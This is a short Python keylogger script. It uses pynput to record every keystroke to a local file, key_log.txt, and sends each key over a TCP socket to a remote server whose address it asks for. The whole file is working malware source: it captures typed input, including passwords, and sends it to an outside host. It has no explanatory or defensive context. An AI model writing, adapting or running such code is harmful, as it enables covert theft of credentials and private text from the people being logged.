from pynput import keyboard
import socket
c=socket.socket()

host=input('[+] Enter Server Host Ip :')            #'127.0.0.1'#socket.gethostname()
port= int(input('[+] Enter Server Port:'))
c.connect((host,port))
# File to log the keys
log_file = "key_log.txt"

def on_press(key):
    try:
        # Try to get the key's character
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
            print({key.char})
            c.send(bytes(f"{key.char}", "utf-8"))
    except AttributeError:
        # Special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")
            print({key})
            c.send(bytes(f"[{key}]", "utf-8"))

def on_release(key):
    if key == keyboard.Key.esc:
         
        # Stop listener
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

c.close()
